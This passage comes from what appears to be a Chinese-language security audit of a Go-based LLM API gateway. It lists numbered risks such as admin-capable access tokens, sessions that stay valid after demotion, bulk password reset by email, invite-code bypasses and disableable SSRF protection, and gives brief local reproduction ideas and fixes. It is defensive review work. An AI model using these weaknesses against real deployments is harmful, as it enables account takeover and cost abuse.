- 涉及文件/函数：
  - `setting/config/config.go:203-269`：反射更新解析失败时直接 `continue`，函数最后仍 `return nil`
  - `model/option.go:588-623`：分层配置更新调用 `config.UpdateConfigFromMap` 后忽略返回值，并把该 key 视为已处理
  - `model/option.go:270-281`：`*Permission` 的 `Atoi` 错误被忽略，非法字符串会把权限值设为 0
  - `model/option.go:283-370`：大量布尔开关以 `value == "true"` 判断，任何拼写异常都会变成 false
  - `model/option.go:404-419`、`456-473`、`506-531`、`564-577`：多项价格、额度、限流和队列参数解析错误被忽略
- 可能后果：后台页面和 `OptionMap` 显示已经保存了新配置，但实际 typed 变量没有变或被置 0；充值比例、最低充值、支付单价、SSRF 开关、注册登录安全开关可能在运行时与管理员认知不一致。重启、定时同步或下一次保存还可能让不同实例产生不同状态。
- 复现思路：本地把 `fetch_setting.allowed_ports` 保存为非法 JSON，或把 `QuotaPerUnit`、`Price`、`StripeUnitPrice` 保存为非数字；检查数据库/`OptionMap` 与对应 typed 变量是否一致。
- 修复建议：配置解析必须 fail closed：解析失败不写 DB、不更新 `OptionMap`、不改变 typed 变量，并向接口返回明确错误。为价格、额度、安全开关建立集中 schema，包含类型、范围、默认值、是否可热更新和是否需要二次确认。
- 优先级：P1
- 当前状态：已确认分层配置和传统配置都存在解析错误静默处理，尚未修复。

### 风险 62：`fetch_setting` SSRF 防护可通过通用设置直接关闭或误配，缺少高危确认与结构化校验

- 标题：全局出站请求 SSRF 防护配置走普通 `/api/option` 更新链路，未见针对私网放行、域名/IP 列表、端口范围的专门后端校验和二次确认
- 影响范围：用户通知 URL、后台模型/Discovery 拉取、倍率同步自定义地址、视频结果代理、MJ 图片代理、未来所有复用全局 fetch 设置的出站请求
- 触发条件：根管理员误操作、被盗后台会话、配置导入错误、前端提交非法端口/列表；或为了临时排障关闭 `enable_ssrf_protection` 后未恢复
- 涉及文件/函数：
  - `setting/system_setting/fetch_setting.go:5-13`：定义 `enable_ssrf_protection`、`allow_private_ip`、域名/IP 列表、端口范围等高危出站策略
  - `setting/system_setting/fetch_setting.go:16-24`：默认开启 SSRF 防护、禁止私网、限制常见端口
  - `controller/option.go:152-343`：通用设置仅列出 OAuth、倍率、状态码、console 等特殊校验，未见 `fetch_setting.*` 专门分支
  - `model/option.go:588-623`：`fetch_setting.*` 命中分层配置热更新，直接走反射解析
- 可能后果：一个全局开关误改会重新打开此前已记录的多个出站风险面：普通用户通知 URL 可探测内网，管理员自定义同步地址可访问内网，视频/MJ 图片代理可拉取私有资源或大文件。该问题不直接充值，但会导致密钥、元数据、内网服务和带宽成本暴露。
- 复现思路：在本地把 `fetch_setting.enable_ssrf_protection=false` 或 `fetch_setting.allow_private_ip=true` 保存后，检查依赖 SSRF 检查的 URL 拉取路径是否接受私网地址。
- 修复建议：将出站安全策略从普通设置中提升为高危操作：需要独立二次确认、原因记录、变更审计、最小化可配置项和自动过期恢复。列表和端口必须用专门解析器校验 CIDR、通配域名、端口范围，并在保存前做 dry-run。
- 优先级：P1
- 当前状态：已确认 `fetch_setting` 走通用配置热更新且缺少专门校验分支，尚未修复。

### 风险 64：充值/价格/支付方式等资产配置缺少统一数值边界，负数、0 或极端值可放大资产事故

- 标题：`QuotaPerUnit`、`Price`、`USDExchangeRate`、支付单价、最低充值、支付方式 JSON 等关键资产参数在通用设置路径下缺少集中范围校验
- 影响范围：Stripe/Epay/Waffo/Creem 等充值到账额度、后台补单、渠道余额换算、前端支付方式展示、最低充值限制、邀请返利额度、运营报表
- 触发条件：管理员误填负数/0/极大值，配置导入包含异常值，前端未覆盖的字段被直接通过 API 更新，热更新后多实例状态不一致
- 涉及文件/函数：
  - `model/option.go:404-419`：`Price`、`USDExchangeRate`、`MinTopUp`、Stripe 单价/最低充值解析后直接赋值
  - `model/option.go:456-473`：Waffo 和 Waffo Pancake 单价/最低充值直接赋值
  - `model/option.go:566-567`：`QuotaPerUnit` 解析后直接赋值
  - `model/option.go:578-579`：`PayMethods` JSON 更新只依赖解析，不校验 method 类型、最低充值、颜色/名称等业务字段
  - `model/topup.go:227`、`469-474`、`641-642`、`714`：多个充值完成路径用 `common.QuotaPerUnit` 计算到账额度
  - `controller/channel-billing.go:353-355`：Moonshot 渠道余额用 `operation_setting.Price` 把人民币余额换算为美元余额
- 可能后果：`QuotaPerUnit` 极大值会把一次正常付款放大成异常额度；0/负数会导致合法订单无法入账或补单失败；`Price` 为 0 或负数会污染渠道余额换算；支付方式 JSON 异常可能让前端展示与后端 `ContainsPayMethod` 判断不一致。该类问题是“卡 bug 充值”和运营误配事故的高价值入口。
- 复现思路：本地通过根管理员设置把 `QuotaPerUnit` 调成极大值或把 `Price` 调成 0，再走测试充值完成函数或渠道余额换算，观察到账额度/余额计算结果。
- 修复建议：建立资产配置 schema：`QuotaPerUnit > 0` 且设置业务上限，`Price/USDExchangeRate > 0`，单价和最低充值有上下限，支付方式类型必须在白名单内。高风险配置变更前显示影响预览，变更后写审计日志并触发对账检查。
- 优先级：P1
- 当前状态：已确认多项资产参数在通用热更新路径缺少统一范围校验，尚未修复。

### 风险 66：管理员/Root 的系统 access token 可直接满足 `AdminAuth`/`RootAuth`，大量后台高危接口不要求 dashboard session

- 标题：`authHelper` 在没有 session 时会用 `Authorization` 里的用户 `access_token` 还原用户角色，`AdminAuth`/`RootAuth` 只是传入更高 `minRole`
- 影响范围：根设置、支付/价格配置、后台补单、用户管理、订阅后台、渠道管理、兑换码、日志删除、性能清理、倍率同步、Custom OAuth 配置
- 触发条件：管理员或 Root 用户生成过系统 access token；该 token 泄露到脚本、CI、浏览器插件、日志、第三方运维工具；请求带上 `Authorization: Bearer <access_token>` 和匹配的 `New-Api-User`
- 涉及文件/函数：
  - `middleware/auth.go:36-85`：无 session 时读取 `Authorization` 并调用 `model.ValidateAccessToken`，把 DB 中的 `Role/Status/Id` 放入 context
  - `middleware/auth.go:95-122`：只要求客户端提供 `New-Api-User` 且与用户 ID 匹配
  - `middleware/auth.go:176-185`：`AdminAuth`/`RootAuth` 只是复用 `authHelper` 并传入角色门槛
  - `model/user.go:889-902`：`ValidateAccessToken` 只按 `access_token` 查用户，没有 scope、过期时间或用途限制
  - `router/api-router.go:128-153`、`168-182`、`189-231`、`233-275`：大量后台路由只挂 `AdminAuth` 或 `RootAuth`
  - 对比证据：`controller/payment_compliance.go:30-37` 专门禁止 access token，说明当前不是全局禁止策略
- 可能后果：一枚长期 Root access token 等同可远程修改支付密钥、价格、SSRF 开关、渠道、用户额度和订阅；不需要浏览器 session、2FA/passkey step-up 或再次输入密码。泄露后攻击面从“后台会话”扩展到所有能发 HTTP 请求的环境，资产类接口影响尤其大。
- 复现思路：本地为 Root 用户生成 access token，然后用该 token 和 `New-Api-User` 调用 `/api/option` 或 `/api/user/topup/complete` 的测试请求；观察是否通过 `RootAuth`/`AdminAuth`。
- 修复建议：把 dashboard session 与 system access token 分成两类认证。默认禁止 access token 访问 `/api/option`、`/api/user` 管理、`/api/subscription/admin`、`/api/channel` 写操作等高危接口；如确需 API 管理，使用独立 scoped admin token，带过期时间、IP 白名单、最小权限、单独审计和二次确认。
- 优先级：P1
- 当前状态：已确认 `AdminAuth`/`RootAuth` 允许 access token 进入，只有少量接口显式禁止，尚未修复。

### 风险 67：cookie session 内的角色和状态 30 天内被信任，禁用/降权用户后旧浏览器会话可能继续拥有后台权限

- 标题：session 使用 cookie store 保存 `role/status/id`，`authHelper` 不重新查 DB；管理员禁用/降权只清 Redis 用户/token 缓存，无法让已签发 cookie session 失效
- 影响范围：管理员禁用、角色降级、Root 降级、账号接管后的应急处置、后台补单/配置/渠道操作、用户资产操作
- 触发条件：管理员账号被禁用或降权时，该账号已有有效浏览器 session；攻击者或原管理员继续使用旧 cookie；session 未过期且 `SESSION_SECRET` 未轮换
- 涉及文件/函数：
  - `main.go:178-187`：使用 `cookie.NewStore`，session `MaxAge` 为 30 天，`HttpOnly=true`，`SameSite=Strict`
  - `controller/user.go:97-103`：登录时把 `id/username/role/status/group` 写入 session
  - `middleware/auth.go:37-42`：认证优先读取 session 中的 `username/role/id/status`
  - `middleware/auth.go:123-138`：禁用状态和角色门槛都基于 session 值判断
  - `controller/user.go:1008-1018`：禁用/升降级后只失效用户缓存和 token 缓存，未见服务端 session 版本失效机制
- 可能后果：运营侧以为已经禁用或降级某个管理员，但其已有浏览器会话仍可在最长 30 天内继续调用后台高危接口；在账号泄露应急中，禁用用户不一定能立刻阻断后台操作。
- 复现思路：本地管理员登录后保留 cookie，再用 Root 将该管理员降级或禁用；继续携带旧 cookie 请求 `/api/user/topup`、`/api/channel` 等后台接口，观察是否仍按旧 session 角色通过。
- 修复建议：session 中只保存用户 ID 和 session version；每次高危鉴权从 DB/缓存读取最新 `role/status/session_version`。用户禁用、降权、改密、重置 2FA/passkey 后递增 session version 或记录 `session_invalid_after`，使旧 cookie 立即失效。
- 优先级：P1
- 当前状态：已确认 session 角色/状态直接参与鉴权，用户状态变更未失效既有 cookie session，尚未修复。

### 风险 68：系统 access token 生成接口无 step-up、无 scope、无过期时间，且 token 可通过 token 自身继续轮换

- 标题：`GET /api/user/self/token` 在普通 `UserAuth` 下直接生成用户系统管理 token；`UserAuth` 本身也接受 access token
- 影响范围：所有普通用户和管理员的系统 access token、后台 API 自动化、Root 运维 token 泄露后的持久化、审计追踪
- 触发条件：用户或管理员点击/调用生成 access token；已泄露 access token 被用于重新生成新 token；浏览器会话被劫持后直接生成长期 token；离职/降权前生成的 token 未及时清除
- 涉及文件/函数：
  - `router/api-router.go:80-88`：`selfRoute` 使用 `UserAuth`，`GET /token` 指向 `GenerateAccessToken`
  - `controller/user.go:319-350`：生成随机 key 后直接写入用户 `access_token` 并返回
  - `model/user.go:99`：用户表只有单个 `AccessToken` 字段，没有 scope、过期时间、创建 IP、最后使用时间等结构化字段
  - `model/user.go:889-902`：校验 token 只查 `access_token`
  - `middleware/auth.go:43-85`：`UserAuth` 允许用 access token 完成认证
- 可能后果：一次会话泄露可升级为长期系统 token；一次 token 泄露又可轮换成新 token，弱化原 token 泄露后的排查和封禁。Root/admin token 与普通用户 token 没有权限域隔离，容易把脚本便利性变成后台运营风险。
- 复现思路：本地先用 session 生成 access token，再仅用该 token 和 `New-Api-User` 调用 `/api/user/self/token`，观察是否可以生成并替换新的 token。
- 修复建议：生成/轮换 access token 必须要求 dashboard session、密码或 2FA/passkey step-up，禁止 access token 自身调用；token 改为多条记录，带名称、scope、过期时间、最后使用时间、创建 IP、可撤销 ID 和审计日志。管理员/Root 的管理 token 默认关闭或必须显式启用。
- 优先级：P1
- 当前状态：已确认 access token 生成接口缺少二次验证、scope 和过期语义，尚未修复。

### 风险 69：管理员强制重置 2FA/Passkey 只依赖 `AdminAuth`，Root 还可操作同级 Root 的二次认证

- 标题：`AdminDisable2FA` 和 `AdminResetPasskey` 没有 `SecureVerificationRequired`、不禁止 access token；`canManageTargetRole` 对 Root 直接返回 true
- 影响范围：用户 2FA、Passkey、账号恢复链路、管理员账号接管防护、Root 账号安全、离职/被盗账号处置
- 触发条件：管理员或 Root session/access token 泄露；恶意管理员强制关闭低权限用户的 2FA/Passkey；Root token 调用同级 Root 的 MFA 重置接口
- 涉及文件/函数：
  - `router/api-router.go:148-152`：`DELETE /user/:id/reset_passkey` 和 `DELETE /user/:id/2fa` 位于 `AdminAuth` 分组
  - `controller/user.go:291-292`：`canManageTargetRole` 对 Root 返回 true，不要求 `myRole > targetRole`
  - `controller/passkey.go:341-379`：管理员重置目标 Passkey 后直接删除凭据
  - `controller/twofa.go:503-557`：管理员强制禁用目标 2FA 后只记录日志
  - `middleware/secure_verification.go:19-77`：已有 step-up 中间件，但这些路由未使用
- 可能后果：泄露的 admin/root access token 可先关闭目标用户 MFA，再通过其他账号恢复/改密链路扩大控制面；Root 与 Root 之间的 MFA 重置没有额外禁止条件，会削弱最高权限账号的互相隔离。
- 复现思路：本地使用管理员 access token 请求低权限用户的 `/api/user/:id/2fa` 或 `/api/user/:id/reset_passkey`；再用 Root 身份尝试目标 Root，观察路由是否只依赖角色函数判断。
- 修复建议：MFA 重置必须要求 dashboard session + `SecureVerificationRequired` + 操作原因；禁止 access token 调用。Root 不能重置同级 Root 的 2FA/Passkey，除非走离线恢复流程或多管理员审批；重置后强制目标用户所有 session/access token/API token 失效。
- 优先级：P1
- 当前状态：已确认管理员 MFA 重置接口缺少 step-up 和 access-token 禁止，Root 同级操作边界过宽，尚未修复。

### 风险 71：邮箱验证码不消费且邮箱绑定时不重新校验唯一性，可在有效期内制造重复邮箱账号

- 标题：邮箱验证码通过后没有删除；`EmailBind` 只校验验证码，不检查邮箱是否已被其他用户绑定
- 影响范围：邮箱绑定、密码重置、账号恢复、用户唯一身份、管理员用户搜索、邮件通知、后续按邮箱操作的所有功能
- 触发条件：同一个邮箱验证码在 10 分钟有效期内被多次使用；用户 A 获取验证码并绑定邮箱后，用户 B 继续使用同一邮箱和验证码调用绑定接口；或并发提交多个绑定请求
- 涉及文件/函数：
  - `controller/misc.go:283-291`：发送邮箱验证码前检查邮箱未被占用，并把验证码注册到内存
  - `common/verification.go:47-56`：`VerifyCodeWithKey` 只比较验证码和有效期，不会消费验证码
  - `controller/user.go:1037-1061`：`EmailBind` 验证通过后直接 `user.Email = email` 并 `Update(false)`，没有再次 `IsEmailAlreadyTaken`
  - `model/user.go:91`：`Email` 只是普通 index，不是唯一索引
  - `model/user.go:810-812`：`IsEmailAlreadyTaken` 用 `RowsAffected == 1` 判断，重复数据出现后判断语义也会失真
- 可能后果：多个账号共享同一邮箱；后续密码重置、通知、管理员搜索和账号归属判断都可能指向多用户。攻击者拿到一次邮箱验证码后，可以给多个账号绑定同一恢复邮箱，放大账号恢复和资产归属争议。
- 复现思路：本地对未占用邮箱发送验证码，先让用户 A 绑定成功，再在验证码有效期内用用户 B 调用同一邮箱绑定；观察 users 表是否出现重复 email。
- 修复建议：验证码成功使用后立即删除；邮箱绑定和注册最终写入前必须在事务中重新检查唯一性；数据库层给非空 email 建唯一约束或使用规范化邮箱表。`IsEmailAlreadyTaken` 应改为 `count > 0`。
- 优先级：P1
- 当前状态：已确认邮箱验证码不消费、绑定阶段不重新查重且数据库无唯一约束，尚未修复。

### 风险 72：密码重置按邮箱批量更新密码，重复邮箱会导致多个账号同时被重置

- 标题：`ResetUserPasswordByEmail` 使用 `WHERE email = ?` 更新密码，不限定单个用户，也不校验匹配行数必须为 1
- 影响范围：密码重置、重复邮箱账号、管理员/普通用户账号接管、客服恢复流程、账号资产归属
- 触发条件：系统中存在重复 email；用户发起密码重置并拿到该 email 的重置 token；调用重置接口后所有同 email 用户密码被改为同一个新密码
- 涉及文件/函数：
  - `controller/misc.go:317-325`：只有 `IsEmailAlreadyTaken(email)` 为 true 时发送重置链接
  - `controller/misc.go:342-370`：重置 token 验证通过后调用 `model.ResetUserPasswordByEmail`，并把新密码返回给调用方
  - `model/user.go:834-843`：`DB.Model(&User{}).Where("email = ?", email).Update("password", hashedPassword)` 会更新所有匹配 email 的用户
  - `model/user.go:91`：email 字段缺少唯一约束
  - 关联风险：风险 71 已确认重复 email 可以通过绑定链路制造
- 可能后果：一个邮箱的重置链接可以把多个账号的密码同时改成同一个新密码；如果重复邮箱中包含高价值账号，恢复链路会变成跨账号接管入口。即使不是恶意，也会造成用户无法登录和客服难以解释的运营事故。
- 复现思路：本地构造两个相同 email 的用户，生成该 email 的密码重置 token 并调用重置接口；观察两个用户密码哈希是否同时变化。
- 修复建议：密码重置应绑定具体 user_id 和一次性 token，而不是只绑定 email；重置前确认 active 用户唯一，`RowsAffected` 必须等于 1；发现重复 email 时拒绝重置并进入人工处理。先修复历史重复数据，再加唯一约束。
- 优先级：P1
- 当前状态：已确认密码重置按 email 批量更新，没有唯一行数保护，尚未修复。

### 风险 73：密码重置后不失效既有 session、系统 access token 和 API token，无法作为账号接管后的止血手段

- 标题：重置密码只更新 `users.password` 并删除验证码，不清理 dashboard session、`access_token`、用户 API tokens 或安全验证状态
- 影响范围：账号恢复、管理员账号应急、泄露 token 止血、后台资产操作、普通 API 调用、长期自动化脚本
- 触发条件：用户或管理员通过邮件重置密码；攻击者已经持有旧 cookie session、系统 access token 或用户 API token；运营以为改密后账号已安全
- 涉及文件/函数：
  - `controller/misc.go:342-370`：`ResetPassword` 只生成新密码、调用重置、删除重置 token 并返回新密码
  - `model/user.go:834-843`：只更新密码字段
  - `main.go:178-187`：dashboard session cookie 最长 30 天
  - `model/user.go:99`、`model/user.go:889-902`：系统 access token 是独立字段，校验不依赖密码
  - `middleware/auth.go:37-85`：既有 session/access token 仍可继续通过鉴权
- 可能后果：用户完成密码重置后，攻击者仍可用旧 session 访问后台或用旧 access token 调用管理接口；普通 API token 也不会被撤销。对管理员账号而言，改密无法阻断前几轮记录的后台资产风险。
- 复现思路：本地登录用户并生成 access token，再走密码重置；使用旧 cookie 或旧 access token 请求 `/api/user/self` 或后台接口，观察是否仍可通过。
- 修复建议：密码重置成功后递增 session version，清空系统 access token，并按策略撤销或暂停用户 API token；管理员/Root 改密或邮件重置后强制所有设备重新登录，清除 secure verification 状态并写审计日志。
- 优先级：P1
- 当前状态：已确认密码重置没有会话和 token 失效逻辑，尚未修复。

### 风险 75：OAuth/邮箱绑定链路缺少统一 `UserAuth` 和 step-up，短暂或陈旧 session 可被用来种下长期登录方式

- 标题：多个绑定入口只读取 session 中的 `id/username`，不走统一 `UserAuth` 的状态/角色校验，也不要求密码/2FA/Passkey step-up
- 影响范围：GitHub、Discord、OIDC、WeChat、Telegram、Custom OAuth、邮箱绑定、账号长期登录入口、管理员账号安全
- 触发条件：攻击者拿到短暂浏览器 session；用户已被禁用但旧 session 尚未失效；恶意脚本在用户登录状态下触发绑定流程；管理员账号在事故处置前被绑定新的第三方登录方式
- 涉及文件/函数：
  - `router/api-router.go:45-53`：OAuth state、邮箱绑定和标准 OAuth callback 在公共路由上，仅挂 `CriticalRateLimit`
  - `controller/oauth.go:64-80`、`142-208`：标准 OAuth 通过 session `username` 判断绑定流程，并用 session `id` 更新绑定
  - `controller/github.go:171-205`、`controller/discord.go:181-214`、`controller/oidc.go:184-218`：内置 OAuth bind 直接从 session 取 `id` 后更新用户
  - `controller/wechat.go:134-177`：WeChat bind 直接从 session 取 `id` 更新用户
  - `controller/user.go:1037-1061`：邮箱绑定直接从 session 取 `id` 更新邮箱
  - `model/user_oauth_binding.go:107-129`：Custom OAuth 允许更新已有 provider 绑定
- 可能后果：一次短暂的 session 泄露可以绑定攻击者控制的 OAuth/邮箱，形成后续长期登录或密码重置入口；禁用/降权未即时失效的旧 session 也可能继续修改恢复方式。对管理员账号而言，这会把临时会话问题升级为持久账号接管风险。
- 复现思路：本地保留用户旧 session，禁用该用户或仅携带 session cookie 调用绑定回调；观察绑定函数是否重新检查 DB 中最新状态和是否要求 step-up。
- 修复建议：所有绑定/解绑恢复方式的接口统一放在 `UserAuth` 后，并要求 `SecureVerificationRequired` 或当前密码；绑定成功后清除其他未完成 OAuth state，记录审计日志并通知原邮箱。禁用/改密/重置 MFA 后必须使绑定接口使用的旧 session 失效。
- 优先级：P1
- 当前状态：已确认多个绑定入口绕过统一 `UserAuth` 中间件且无 step-up，尚未修复。

### 风险 76：用户 `aff_code` 被当成无限邀请码，可能绕过邀请码的次数、过期和状态控制

- 标题：注册时如果找不到 `invite_codes.code`，会继续把输入值当作用户 `aff_code` 查询；`aff_code` 没有 MaxUses、ExpiredTime、Status 或消费记录
- 影响范围：邀请制注册、邀请码运营、邀请奖励、注册风控、批量小号注册、邀请码发放统计
- 触发条件：`InviteOnlyRegisterEnabled` 开启；攻击者拿到任意现有用户的 `aff_code`；或公开推广链接带 `aff` 参数；该 aff code 被反复用于注册/OAuth 注册
- 涉及文件/函数：
  - `controller/invite.go:22-35`：注册邀请校验调用 `GetInviterIdByRegistrationInviteCodeWithTx`
  - `model/invite_code.go:266-288`：找不到邀请码记录后调用 `GetUserIdByAffCode(code)`，成功即返回 inviterId
  - `model/invite_code.go:295-304`：消费阶段如果找不到 invite code 记录直接返回 nil，不记录 aff code 使用次数
  - `model/user.go:104`：`AffCode` 是用户表字段，长度 32、唯一索引，但没有次数/过期/状态
  - `controller/oauth.go:277-304`、`controller/user.go:178-201`：普通注册和 OAuth 注册都会走该邀请校验/消费链路
- 可能后果：运营以为发放的是一次性或有限次数邀请码，但用户 aff code 可以作为无限注册入口；邀请制站点可能被已有用户的公开推广码绕过名额控制。若邀请奖励配置为正数，批量注册会持续触发邀请奖励逻辑。
- 复现思路：本地开启 invite-only，使用某个用户的 `aff_code` 连续注册多个账号；观察每次都能拿到 inviterId，且没有对应 invite code 的 UsedCount/Status 变化。
- 修复建议：把 aff code 和 invite code 语义拆开。invite-only 模式只接受 `invite_codes` 表中的有效邀请码；推广 aff code 如需允许注册，应有独立开关、频率限制、每日上限、总使用次数和审计记录。
- 优先级：P1
- 当前状态：已确认 aff code fallback 可绕过 invite code 的状态/次数/过期控制，尚未修复。

### 风险 77：邀请码消费依赖疑似无效的 `FOR UPDATE`，并发注册可能超用同一个有限次数邀请码

- 标题：邀请码校验和消费都使用 `Set("gorm:query_option", "FOR UPDATE")`，若 GORM v2 下该方式不生效，则 `UsedCount >= MaxUses` 检查会被并发绕过
- 影响范围：邀请码 MaxUses、邀请制注册、邀请奖励、邀请人统计、批量注册风控
- 触发条件：同一个邀请码剩余 1 次或少量次数；多个注册请求并发进入；数据库/ORM 没有真实行锁；所有请求都在消费前看到旧 `UsedCount`
- 涉及文件/函数：
  - `model/invite_code.go:272-278`：校验阶段用 `Set("gorm:query_option", "FOR UPDATE")` 查询邀请码
  - `model/invite_code.go:300-317`：消费阶段再次用同样方式查询，然后 `UsedCount++` 并 Save
  - `model/invite_code.go:243-259`：`validateInviteCode` 只基于当前内存对象判断 `UsedCount >= MaxUses`
  - `controller/user.go:190-201`、`controller/oauth.go:280-339`：注册创建用户和消费邀请码在事务内执行
  - 关联证据：风险 31 已记录项目中多处 `gorm:query_option` 行锁疑似无效
- 可能后果：一个一次性邀请码在高并发下注册出多个账号；如果邀请奖励开启，邀请人和被邀请人的额度奖励也可能被重复发放，造成注册资产和风控名额失真。
- 复现思路：本地创建 `MaxUses=1` 的邀请码，并发提交多个注册请求；观察是否有多个用户创建成功、`UsedCount` 是否超过 1 或最后写覆盖。
- 修复建议：使用 GORM v2 `clause.Locking{Strength:"UPDATE"}` 或条件原子更新：`WHERE used_count < max_uses AND status=enabled`。消费成功必须检查 `RowsAffected == 1`；唯一/有限邀请码应有独立使用记录表，按 code+user 记录幂等。
- 优先级：P1
- 当前状态：已确认邀请码消费依赖同类疑似无效行锁，尚未修复。

### 风险 78：邀请奖励在注册事务提交后发放且错误被忽略，可能出现已消耗邀请码但奖励漏发或重复发放

- 标题：用户创建和邀请码消费在事务内完成，但 `QuotaForInvitee`、`QuotaForInviter`、`AffCount` 等奖励在 `FinalizeOAuthUserCreation` 中事务后执行，并忽略额度更新错误
- 影响范围：新用户赠额、被邀请人赠额、邀请人 `aff_quota/aff_history/aff_count`、邀请奖励日志、客服对账
- 触发条件：注册事务提交成功后，额度更新失败、Redis/DB 短暂异常、进程崩溃；或同一后置函数被重复调用；邀请奖励配置为正数
- 涉及文件/函数：
  - `controller/user.go:190-209`：普通注册事务只创建用户、消费邀请码，随后调用 `FinalizeOAuthUserCreation`
  - `controller/oauth.go:280-345`：OAuth 注册同样在事务后调用 `FinalizeOAuthUserCreation`
  - `model/user.go:591-617`：`FinalizeOAuthUserCreation` 发放新用户日志、被邀请人额度、邀请人奖励
  - `model/user.go:609-615`：`IncreaseUserQuota` 和 `inviteUser` 的返回值被 `_ =` 忽略
  - `model/user.go:455-463`：`inviteUser` 读出 inviter 后自增并 `DB.Save`，没有和注册事务绑定
- 可能后果：用户已经注册成功且邀请码已被消费，但邀请双方没有拿到奖励；或重试某段后置逻辑时重复给同一注册关系发奖。运营报表会出现 invite code 已使用、奖励日志/余额不一致的情况。
- 复现思路：本地让注册事务成功后模拟 `IncreaseUserQuota` 或 `inviteUser` 写库失败；观察用户存在且邀请码已消费，但奖励缺失。再重复调用 `FinalizeOAuthUserCreation`，观察奖励是否可重复增加。
- 修复建议：邀请奖励必须纳入同一事务，或写入 outbox/ledger 并用唯一键保证按 `inviter_id + invitee_id + reward_type` 幂等。任何奖励发放失败都应进入补偿队列并可审计，不能静默忽略。
- 优先级：P1
- 当前状态：已确认邀请奖励在事务外且错误被忽略，尚未修复。

### 风险 79：开启 `GENERATE_DEFAULT_TOKEN` 后，每个密码注册用户会获得永不过期且无限额度的默认 API token

- 标题：默认 token 逻辑设置 `ExpiredTime=-1`、`UnlimitedQuota=true`，一旦环境开关误启，注册小号即可获得无限 API 调用入口
- 影响范围：新用户注册、API token、模型调用成本、渠道成本、滥用风控、注册促销活动
- 触发条件：部署环境设置 `GENERATE_DEFAULT_TOKEN=true`；密码注册开放；攻击者批量注册账号；默认 token 自动创建成功
- 涉及文件/函数：
  - `common/init.go:147-148`：`GENERATE_DEFAULT_TOKEN` 环境变量控制默认 token，默认 false
  - `controller/user.go:210-229`：普通密码注册后生成默认令牌
  - `controller/user.go:224-227`：默认 token `ExpiredTime=-1`、`RemainQuota=500000`、`UnlimitedQuota=true`
  - `controller/user.go:139-201`：注册成功后先创建用户，再进入默认 token 逻辑
- 可能后果：误开开关后，任意新注册账号直接拿到无限额度 token，绕过用户余额和充值体系；即使注册送额很低，API token 仍可无限消耗渠道成本。这是典型运营配置误触发导致的免费调用风险。
- 复现思路：本地设置 `GENERATE_DEFAULT_TOKEN=true` 后注册新用户，检查 token 表中新 token 的 `unlimited_quota`、`expired_time` 和 `remain_quota`。
- 修复建议：默认 token 不应无限额度或永不过期；若保留该功能，应显式标记为开发/内测模式，生产启动时拒绝 `GENERATE_DEFAULT_TOKEN=true` 或要求额外确认。默认 token 额度应受注册送额、模型/分组限制和全局风控控制。
- 优先级：P1
- 当前状态：已确认默认 token 开关开启后会生成无限额度 token，尚未修复。

### 风险 81：API token 完整密钥查看接口缺少 step-up，系统 access token 或旧 session 可批量导出所有 API key

- 标题：`/api/token/:id/key` 和 `/api/token/batch/keys` 只在 `UserAuth` 后加限流/禁缓存，没有要求当前密码、2FA/Passkey 或 dashboard session
- 影响范围：用户 API token、管理员 API token、下游模型调用成本、token 泄露后批量扩散、客服/运维脚本
- 触发条件：用户 dashboard session 泄露；系统 access token 泄露；旧 session 未失效；攻击者知道或枚举用户自己的 token id；批量请求 key 查看接口
- 涉及文件/函数：
  - `router/api-router.go:276-288`：token 路由整体使用 `UserAuth`，查看单个/批量 key 仅加 `CriticalRateLimit` 和 `DisableCache`
  - `controller/token.go:80-94`：`GetTokenKey` 返回 `token.GetFullKey()`
  - `controller/token.go:338-358`：`GetTokenKeysBatch` 最多一次返回 100 个完整 key
  - `middleware/auth.go:36-85`：`UserAuth` 可被系统 access token 满足
  - 对比证据：`router/api-router.go:241` 的渠道密钥查看已经使用 `SecureVerificationRequired`
- 可能后果：一次 dashboard session 或系统 access token 泄露，可以升级为所有 API key 泄露；即使后续重置密码，前轮风险 73 已记录 API token 不会自动撤销，攻击者仍可继续消耗模型成本。
- 复现思路：本地用用户系统 access token 和 `New-Api-User` 调用 `/api/token/batch/keys`，观察是否可以拿到完整 API key。
- 修复建议：完整 key 查看应要求 dashboard session + `SecureVerificationRequired`，禁止系统 access token 调用；批量查看增加更严格的 step-up、原因字段和审计日志。更安全的策略是只在创建时展示一次，之后只允许轮换而不是回显。
- 优先级：P1
- 当前状态：已确认 API token 完整 key 查看缺少 step-up 和 access-token 禁止，尚未修复。

### 风险 82：token 的模型限制只写入 context，未在 relay/distributor 路径找到实际拦截点

- 标题：`ModelLimitsEnabled` 和 `ModelLimits` 在认证时被设置为 `token_model_limit*` context，但代码搜索未发现后续按该字段拒绝模型请求
- 影响范围：用户 API token 模型白名单/黑名单、子账号隔离、客户分发 token、贵价模型成本控制、前端显示与后端真实校验一致性
- 触发条件：用户创建 token 并启用模型限制；调用受限模型；relay 分发路径没有读取 `token_model_limit` 执行拦截
- 涉及文件/函数：
  - `controller/token.go:217-220`、`297-298`：创建/更新 token 可保存 `ModelLimitsEnabled` 和 `ModelLimits`
  - `model/token.go:332-349`：提供 `GetModelLimitsMap`
  - `middleware/auth.go:421-426`：只把限制写入 gin context
  - 代码搜索证据：`rg "token_model_limit|token_model_limit_enabled"` 仅命中 `middleware/auth.go` 的设置逻辑，未见 relay 执行端读取
  - `middleware/distributor.go:350-396`、`relay/common/relay_info.go:433-445`：模型和分组继续进入分发信息，但未见 token 模型限制判断
- 可能后果：用户以为某个 token 只能调用指定模型，但后端可能允许它调用所有用户可用模型；如果 token 被分发给客户或员工，会绕过贵价模型/敏感模型隔离，造成额外成本和合规风险。
- 复现思路：本地创建只允许低价模型的 token，然后用该 token 请求未列入 `ModelLimits` 的高价模型；观察是否被后端拒绝。
- 修复建议：在模型解析完成、渠道选择前统一检查 `token_model_limit_enabled`，以原始模型名和映射后模型名都做校验；限制语义明确为 allowlist，并覆盖 chat、responses、audio、image、task、realtime 等所有 relay mode。
- 优先级：P1
- 当前状态：已确认保存/设置 token 模型限制的代码存在，但未找到执行端拦截，尚未修复。

### 风险 83：删除/禁用 token 后 Redis 缓存异步失效，缓存删除失败会让旧 token 在 TTL 内继续可用

- 标题：`GetTokenByKey` 优先读 Redis；删除和更新后只异步 set/delete 缓存，失败只写日志，不阻断接口返回成功
- 影响范围：token 删除、禁用、过期、耗尽、批量删除、用户禁用后的 token 阻断、泄露 token 应急
- 触发条件：Redis 启用；token 已被删除/禁用/改状态；异步缓存删除失败、延迟执行或进程退出；后续请求命中旧 Redis token
- 涉及文件/函数：
  - `model/token.go:255-276`：`GetTokenByKey` 在 Redis enabled 时先 `cacheGetTokenByKey`
